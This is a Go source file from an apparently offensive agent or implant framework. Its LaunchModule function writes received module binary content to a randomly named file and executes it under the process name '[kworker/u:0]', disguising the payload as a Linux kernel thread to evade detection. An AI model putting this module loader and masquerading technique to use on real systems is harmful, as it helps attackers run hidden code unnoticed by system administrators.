//go:build !windows
// +build !windows

package agent

import (
	"fmt"
	"os"

	"github.com/ariary/fileless-xec/pkg/exec"
	encryption "github.com/ariary/go-utils/pkg/encrypt"
)

//LaunchModule: execute module (not write into disk if on linux or macOS)
func LaunchModule(moduleBinaryContent string, socketName chan string) {
	binary := "dummy" + encryption.GenerateRandom() + ".exe" //TODO: delete when kill
	//write binary file locally
	err := exec.WriteBinaryFile(binary, moduleBinaryContent)
	if err != nil {
		fmt.Println(err)
	}

	//execute it
	name := SOCKET + "." + encryption.GenerateRandom()
	os.Setenv(COCO_SOCKET_ENVVAR, name)
	environ := os.Environ()
	socketName <- name
	err = exec.UnstealthyExec(binary, []string{"[kworker/u:0]"}, environ)
	fmt.Println(err)
}
